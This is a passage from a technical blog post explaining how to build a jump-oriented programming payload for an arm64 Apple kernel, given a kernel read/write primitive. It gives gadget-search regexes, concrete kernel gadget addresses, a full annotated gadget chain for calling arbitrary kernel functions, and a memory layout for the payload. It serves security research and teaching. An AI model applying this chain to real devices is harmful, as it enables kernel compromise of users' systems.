pc = GADGET_PROLOGUE_2
x0 = REGION_0
x1 = JOP_CHAIN[0]
```

After `GADGET_PROLOGUE_2`, we want to execute gadgets to set `x23` to a memory region of values to
populate and `x20` to a pointer to the next dispatch node after `GADGET_POPULATE_2` (we already
took care of `x8` in the prologue). The only data pointer we have in a register at this point is
`REGION_0` in `x0` and `x19`, so it's worth considering whether `REGION_0` can serve the purposes
of either the memory population region (`x23`) or the next dispatch node (`x20`). That way, we
wouldn't have to perform extra memory loads.

The dispatch node struct requires that offset 0 be a pointer to the gadget code to execute, which
conflicts with the definition of `REGION_0` which has a pointer to `REGION_1` at that offset. Thus,
we'll need to load at least the next dispatch node pointer, `x20`, from memory.

On the other hand, the memory population region doesn't inherently conflict with `REGION_0`.
`GADGET_POPULATE_2` does load the value at offset 0 into register `x2`, which means we would be
wasting one of our loaded registers by setting it to `REGION_1` rather than something useful, but
`x2` isn't usable anyway because it gets clobbered by the dispatch gadget. All the other registers,
`x3` through `x7` and `x9` through `x12`, will be filled with valid data from that region. Thus, we
can safely make `REGION_0` the region from which we populate register values. For clarity, I've
renamed this region `REGION_POPULATE_VALUES` in the JOP program.

Getting back to the steps after our prologue gadget, we need to load a value from memory into `x20`
and copy either `x0` or `x19` into register `x23` before executing `GADGET_POPULATE_2`. Using the
regex `: mov x23, x\(0\|19\) ; bl\?r x8`, I was able to quickly find a gadget for the latter:

```
0xfffffff00674c99c : mov x23, x19 ; br x8
```

Similarly, I using the following regex to look for candidate gadgets to load `x20`:

```
: ldr x20, \[x\(0\|19\), [^;]*; \([^;]*; \)\{0,2\}bl\?r x8
```

There were several matching candidates, including:

```
0xfffffff006b8f858 : ldr x20, [x0, #0x40] ; ldr x8, [x0] ; ldr x8, [x8, #0xc8] ; blr x8
0xfffffff0072eb900 : ldr x20, [x0, #0x90] ; ldr x8, [x19, #0x70] ; blr x8
0xfffffff006291d34 : ldr x20, [x19, #0xc0] ; ldr x8, [x0] ; ldr x8, [x8, #0xa0] ; blr x8
```

The only important differences between these gadgets are the effects on the memory regions. For
example, the first gadget will require that `REGION_POPULATE_VALUES` has a pointer to a memory
region at offset `0x40`, while the second gadget requires that `REGION_POPULATE_VALUES` has a
pointer to a memory region at offset `0x90`. Choosing the right one will depend on what other
constraints get placed on the `REGION_POPULATE_VALUES` memory region, and so we can leave the
specific choice until later in the design process.

I'll leave off at this point: I hope you have enough of an idea of the design process, and I fear
that continuing on will just be boring. Suffice to say, by continuing in this manner, it's possible
to fill in all of the gaps in the JOP program.


## The final JOP program

Here is the final JOP program in its entirety. The way to read this is as follows:

* The listing shows the chronological execution of gadgets, starting with the call to the
  2-argument primitive and ending with the JOP program's final `ret`.
* The first top-level (i.e., non-indented) statement represents the call to the 2-argument
  primitive, called `kernel_call_2`. It is followed by first-level statements describing the
  register state and memory regions at the point `kernel_call_2` calls into the JOP payload.
* Memory regions are defined using either byte-indexed dictionary syntax (for sparse regions) or
  array syntax (for contiguous regions). Memory regions are always accessed using byte indexing.
* Subsequent top-level statements indicate what gadget is being invoked. Each such top-level
  statement is followed by second-level statements containing the assembly of the gadget and
  first-level statements describing the state change of registers and memory.
* Since the `JOP_DISPATCH` gadget is executed so frequently, subsequent occurrences after the first
  have been elided such that the state changes are attributed to the preceding gadget.

```
kernel_call_2
	REGION_POPULATE_VALUES = {
		  0: REGION_1
		  8: ARGUMENT_0
		 10: ARGUMENT_13
		 18: REGION_ARGUMENTS_2_TO_11
		 20: ARGUMENT_1
		 28: FUNCTION
		 30: GADGET_CALL_FUNCTION_1
		 38: GADGET_POPULATE_2
		 40
		 48: ARGUMENT_12
		 c0: JOP_CHAIN_2
		268: REGION_2
		288: <-RESULT
	}
	REGION_1 = {
		 a0: JOP_DISPATCH
		 d0: GADGET_STORE_RESULT_2
		390: JOP_DISPATCH
	}
	REGION_ARGUMENTS_2_TO_11 = {
		 0: ARGUMENT_2
		 8: ARGUMENT_3
		10: ARGUMENT_4
		18: ARGUMENT_5
		20: ARGUMENT_6
		28: ARGUMENT_7
		30: ARGUMENT_8
		38: ARGUMENT_9
		40: ARGUMENT_10
		48: ARGUMENT_11
	}
	REGION_2 = {
		0: REGION_3
	}
	REGION_3 = {
		158: GADGET_EPILOGUE_2
	}
	JOP_CHAIN_1 = [
		MOV_X23_X19__BR_X8
		GADGET_INITIALIZE_X20_1
		MOV_X25_X19__BR_X8
		GADGET_POPULATE_2
	]
	JOP_CHAIN_2 = [
		MOV_X19_X3__BR_X8
		MOV_X20_X6__BLR_X8
		MOV_X21_X4__BLR_X8
		MOV_X22_X12__BLR_X8
		MOV_X23_X5__BR_X8
		MOV_X24_X7__BLR_X8
		MOV_X8_X9__BR_X10
	]
	x0 = REGION_POPULATE_VALUES
	x1 = JOP_CHAIN_1
	pc = GADGET_PROLOGUE_2

GADGET_PROLOGUE_2 (0xfffffff0066012a0):
		;; Save registers x19-x28, save the frame (x29, x30), and make
		;; room for 0x40 bytes of local variables. sp must be
		;; preserved until the epilogue.
		sub sp, sp, #0xa0
		stp x28, x27, [sp, #0x40]
		stp x26, x25, [sp, #0x50]
		stp x24, x23, [sp, #0x60]
		stp x22, x21, [sp, #0x70]
		stp x20, x19, [sp, #0x80]
		stp x29, x30, [sp, #0x90]
		add x29, sp, #0x90
		mov x19, x0
		ldr x8, [x19]
		ldr x8, [x8, #0x390]
		blr x8
	SAVE_REGISTERS(x19, ..., x28)
	x29 = STACK_FRAME()
	RESERVE_STACK(0x40)
	x19 = REGION_POPULATE_VALUES
	x8 = REGION_POPULATE_VALUES[0] = REGION_1
	x8 = REGION_1[0x390] = JOP_DISPATCH
	pc = JOP_DISPATCH

;; Just after the prologue we have the following register values:
;; 	x0 = REGION_POPULATE_VALUES
;; 	x1 = JOP_CHAIN_1
;; 	x8 = JOP_DISPATCH
;; 	x19 = REGION_POPULATE_VALUES
;; We will populate registers using GADGET_POPULATE_2. Since we're using this
;; gadget with JOP_DISPATCH, we first need to initialize x20 to JOP_CHAIN_2 and
;; x23 to REGION_POPULATE_VALUES.

JOP_DISPATCH (0xfffffff006a4e1a8):
		ldp x2, x1, [x1]
		br x2
	x2 = MOV_X23_X19__BR_X8
	pc = MOV_X23_X19__BR_X8

MOV_X23_X19__BR_X8 (0xfffffff00674c99c)
		mov x23, x19
		br x8
	x23 = REGION_POPULATE_VALUES
	pc = JOP_DISPATCH
	x2 = GADGET_INITIALIZE_X20_1
	pc = GADGET_INITIALIZE_X20_1

GADGET_INITIALIZE_X20_1 (0xfffffff006291d34):
		;; This is a hack to get x20 to point to JOP_CHAIN_2 before
		;; using GADGET_POPULATE_2.
		ldr x20, [x19, #0xc0]
		ldr x8, [x0]
		ldr x8, [x8, #0xa0]
		blr x8
	x20 = REGION_POPULATE_VALUES[0xc0] = JOP_CHAIN_2
	x8 = REGION_POPULATE_VALUES[0] = REGION_1
	x8 = REGION_1[0xa0] = JOP_DISPATCH
	pc = JOP_DISPATCH
	x2 = MOV_X25_X19__BR_X8
	pc = MOV_X25_X19__BR_X8

;; We're about to execute GADGET_POPULATE_2. We want to fill the following
;; registers:
;; 	x19 = ARGUMENT_0
;; 	x20 = ARGUMENT_1
;; 	x21 = ARGUMENT_13
;; 	x22 = ARGUMENT_12
;; 	x23 = REGION_ARGUMENTS_2_TO_11
;;	x24 = FUNCTION
;; 	x25 = REGION_POPULATE_VALUES (CALL_RESUME)
;; Last of all we want to set:
;; 	x8 = GADGET_CALL_FUNCTION_1
;; 	pc = GADGET_POPULATE_2
;; The GADGET_POPULATE_2 gadget will give us control of the following
;; registers:
;; 	x3, x4, x5, x6, x7, x9, x10, x11, x12
;; Since we already have REGION_POPULATE_VALUES in x19, we'll set x25 now.

MOV_X25_X19__BR_X8 (0xfffffff006707570):
		mov x25, x19
		br x8
	x25 = REGION_POPULATE_VALUES
	pc = JOP_DISPATCH
	x2 = GADGET_POPULATE_2
	pc = GADGET_POPULATE_2

GADGET_POPULATE_2 (0xfffffff006ce40e4):
		ldp x2, x3, [x23]
		ldp x4, x5, [x23, #0x10]
		ldp x6, x7, [x23, #0x20]
		ldp x9, x10, [x23, #0x30]
		ldp x11, x12, [x23, #0x40]
		stp x22, x21, [sp, #0x20]
		stp x11, x12, [sp, #0x10]
		stp x9, x10, [sp]
		mov x0, x19
		mov x1, x20
		blr x8
	x0 = REGION_POPULATE_VALUES
	x1 = JOP_CHAIN_2
	x2 = REGION_POPULATE_VALUES[0] = REGION_1
	x3 = REGION_POPULATE_VALUES[0x8] = ARGUMENT_0
	x4 = REGION_POPULATE_VALUES[0x10] = ARGUMENT_13
	x5 = REGION_POPULATE_VALUES[0x18] = REGION_ARGUMENTS_2_TO_11
	x6 = REGION_POPULATE_VALUES[0x20] = ARGUMENT_1
	x7 = REGION_POPULATE_VALUES[0x28] = FUNCTION
	x9 = REGION_POPULATE_VALUES[0x30] = GADGET_CALL_FUNCTION_1
	x10 = REGION_POPULATE_VALUES[0x38] = GADGET_POPULATE_2
	x11 = REGION_POPULATE_VALUES[0x40]
	x12 = REGION_POPULATE_VALUES[0x48] = ARGUMENT_12
	pc = JOP_DISPATCH
	x2 = MOV_X19_X3__BR_X8
	pc = MOV_X19_X3__BR_X8

;; Now that we've populated the registers, we just need to move the values to
;; where they belong.

MOV_X19_X3__BR_X8 (0xfffffff0068804cc):
		mov x19, x3
		br x8
	x19 = ARGUMENT_0
	pc = JOP_DISPATCH
	x2 = MOV_X20_X6__BLR_X8
	pc = MOV_X20_X6__BLR_X8

MOV_X20_X6__BLR_X8 (0xfffffff0070e3738):
		mov x20, x6
		blr x8
	x20 = ARGUMENT_1
	pc = JOP_DISPATCH
	x2 = MOV_X21_X4__BLR_X8
	pc = MOV_X21_X4__BLR_X8

MOV_X21_X4__BLR_X8 (0xfffffff00677a398):
		mov x21, x4
		blr x8
	x21 = ARGUMENT_13
	pc = JOP_DISPATCH
	x2 = MOV_X22_X12__BLR_X8
	pc = MOV_X22_X12__BLR_X8

MOV_X22_X12__BLR_X8 (0xfffffff0067f9dfc):
		mov x22, x12
		blr x8
	x22 = ARGUMENT_12
	pc = JOP_DISPATCH
	x2 = MOV_X23_X5__BR_X8
	pc = MOV_X23_X5__BR_X8

MOV_X23_X5__BR_X8 (0xfffffff00678bdbc):
		mov x23, x5
		br x8
	x23 = REGION_ARGUMENTS_2_TO_11
	pc = JOP_DISPATCH
	x2 = MOV_X24_X7__BLR_X8
	pc = MOV_X24_X7__BLR_X8

MOV_X24_X7__BLR_X8 (0xfffffff006879350):
		mov x24, x7
		blr x8
	x24 = FUNCTION
	pc = JOP_DISPATCH
	x2 = MOV_X8_X9__BR_X10
	pc = MOV_X8_X9__BR_X10

MOV_X8_X9__BR_X10 (0xfffffff0067163d0):
		mov x8, x9
		br x10
	x8 = GADGET_CALL_FUNCTION_1
	pc = GADGET_POPULATE_2

;; At this point, we have set the following registers:
;; 	x8 = GADGET_CALL_FUNCTION_1
;; 	x19 = ARGUMENT_0
;; 	x20 = ARGUMENT_1
;; 	x21 = ARGUMENT_13
;; 	x22 = ARGUMENT_12
;; 	x23 = REGION_ARGUMENTS_2_TO_11
;;	x24 = FUNCTION
;; 	x25 = REGION_POPULATE_VALUES
;; 	pc = GADGET_POPULATE_2

GADGET_POPULATE_2 (0xfffffff006ce40e4):
		ldp x2, x3, [x23]
		ldp x4, x5, [x23, #0x10]
		ldp x6, x7, [x23, #0x20]
		ldp x9, x10, [x23, #0x30]
		ldp x11, x12, [x23, #0x40]
		stp x22, x21, [sp, #0x20]
		stp x11, x12, [sp, #0x10]
		stp x9, x10, [sp]
		mov x0, x19
		mov x1, x20
		blr x8
	x0 = ARGUMENT_0
	x1 = ARGUMENT_1
	x2 = ARGUMENT_2
	x3 = ARGUMENT_3
	x4 = ARGUMENT_4
	x5 = ARGUMENT_5
	x6 = ARGUMENT_6
	x7 = ARGUMENT_7
	x9 = ARGUMENT_8
	x10 = ARGUMENT_9
	x11 = ARGUMENT_10
	x12 = ARGUMENT_11
	STACK = [
		ARGUMENT_8
		ARGUMENT_9
		ARGUMENT_10
		ARGUMENT_11
		ARGUMENT_12
		ARGUMENT_13
		?
		?
	]
	pc = GADGET_CALL_FUNCTION_1

;; Now all the arguments are set up correctly and we will execute
;; GADGET_CALL_FUNCTION_1. The following gadget allows us to resume execution
;; after the function call without messing with x30.

GADGET_CALL_FUNCTION_1 (0xfffffff00753ac98):
		blr x24
		mov x19, x0
		ldr x8, [x25]
		ldr x8, [x8, #0xd0]
		mov x0, x25
		blr x8
	pc = FUNCTION
	x0 = RESULT
	x19 = RESULT
	x8 = REGION_POPULATE_VALUES[0] = REGION_1
	x8 = REGION_1[0xd0] = GADGET_STORE_RESULT_2
	x0 = REGION_POPULATE_VALUES
	pc = GADGET_STORE_RESULT_2

GADGET_STORE_RESULT_2 (0xfffffff00629ee70):
		str x19, [x0, #0x288]
		ldr x0, [x0, #0x268]
		ldr x8, [x0]
		ldr x8, [x8, #0x158]
		blr x8
	REGION_POPULATE_VALUES[0x288] = RESULT
	x0 = REGION_POPULATE_VALUES[0x268] = REGION_2
	x8 = REGION_2[0] = REGION_3
	x8 = REGION_3[0x158] = GADGET_EPILOGUE_2
	pc = GADGET_EPILOGUE_2

GADGET_EPILOGUE_2 (0xfffffff0070ef450):
		;; Reset stack to entry conditions and return to caller. sp
		;; must have been preserved from the prologue.
		ldp x29, x30, [sp, #0x90]
		ldp x20, x19, [sp, #0x80]
		ldp x22, x21, [sp, #0x70]
		ldp x24, x23, [sp, #0x60]
		ldp x26, x25, [sp, #0x50]
		ldp x28, x27, [sp, #0x40]
		add sp, sp, #0xa0
		ret
	RESTORE_REGISTERS(x19, ..., x28)
	pc = CALLER
```


## Laying out the payload in memory

The only thing left is figuring out how to lay the payload out in memory. Ideally we'd want to take
up the minimal amount of space possible. Fortunately, this process is relatively straightforward:
look at the span of each memory region and the gaps in each region and try to fit them together
like puzzle pieces.

This is the design I eventually settled on for call strategy 5:

```
     0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
    +----------------------------------------------------------------+
  0 |BB          BBAAAAAAAAAAAAAAAA  AACCCCCCCCCCCCCCCCCCCCDDEE    AA|
100 |JJJJJJJJJJJJJJJJKKKKKKKKKKKKKKKKKKKKKKKKKKKK                    |
200 |                                        AA      **          BB  |
    +----------------------------------------------------------------+
     0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f

    A = REGION_POPULATE_VALUES   =   0 - 270 @  38
    * = RESULT                   =   0 - 8   @ 288 + REGION_POPULATE_VALUES
    B = REGION_1                 =  a0 - 398 @ -a0
    C = REGION_ARGUMENTS_2_TO_11 =   0 - 50  @  88
    D = REGION_2                 =   0 - 8   @  d8
    E = REGION_3                 = 158 - 160 @ -78

    J = JOP_CHAIN_1              =   0 - 40  @ 100
    K = JOP_CHAIN_2              =   0 - 70  @ 140
```

## Getting it right the first time

In my experience, the most important part of creating a JOP payload in a restricted environment
(that is, where you cannot debug the program) is making sure to get it right the first time.
Debugging exploit payloads via trial-and-error is hard: every time I have been forced to debug, the
time spent debugging significantly outweighed all the other development steps combined. However,
with a careful design and documentation process, it's possible to get it right the first time more
often than not.

For me, the key is to document exactly how every piece of the JOP program works before writing any
other code. (You can see an example of this in the file-level comment in [call_strategy_5.c]: the
file comment, which was completed before anything else was even written, contains the full text
contents of the JOP program above.) I only start writing code once I've verified that every single
step of the JOP program is correct and specified exactly how the payload will be laid out in
memory. That way, I can check the code simply by comparing the generated JOP payload to the
expected layout. Since rigorous verification ensures that errors in the initial design are rare,
once I've checked that the generated payload looks correct, I can be pretty confident that it will
work as expected.


## Conclusion

Designing a JOP program can be complicated, but I hope that this post has shed some light on how it
can be done. In many ways designing a JOP program is like putting together a jigsaw puzzle: it's
all about finding the pieces and figuring out how they best fit together. If you go in knowing what
you want and with a methodical approach, it's relatively straightforward (if a bit technical and
tedious).


## Footnotes
{:.no_toc}

[^1]: I've gotten in the habit of referring to jump-oriented programs as "JOP programs", despite
      the redundancy of the "P". And no, in case you're wondering, that does not mean automated
      teller machines should be referred to as "ATM machines". It's simply because I need to
      distinguish between "JOP" as a technique and "JOP programs" as a specific implementation of
      that technique.

[^2]: Of course, if you have a kernel memory read/write primitive, as I'm assuming for this post,
      then you could perform almost all actions directly in userspace anyway. However, it's usually
      easier to call a kernel function than it is to reimplement that kernel function in userspace
      using read/write primitives.

[^3]: I'm not sure why Apple refers to its architecture as arm64 while ARM refers to the 64-bit
      ARMv8 execution state as AArch64.

[^4]: My ROPgadget patch adds a few lines so that all segments and sections marked with the execute
      memory protection get processed. I'll try to clean it up and publish it sometime soon.

[^5]: Here we are assuming that all the saved arguments in the structure are 64 bits, which means
      we have full control of the top 6 words of the stack. Thus, even if the true arguments to the
      target function are not 64-bit words, we can pad the true arguments inside 6 "fake" arguments
      so that the target function receives the true arguments with their expected alignment.

[^6]: The first two gadgets might initially seem useful because they load register `x8`, the
      function to call, from memory. However, these gadgets probably cause more trouble than
      they're worth because register `x8` is loaded via `x19`, which is used as argument 0
      (register `x0`) to the target function call. Clearly we have no control over what argument 0
      to the target function is (it may not even be a pointer), so the only way this is workable is
      if we load another gadget into `x8` that fixes `x0` before jumping to the true function. But
      at this point we've already lost the advantage provided by those instructions, so we might as
      well get rid of them.
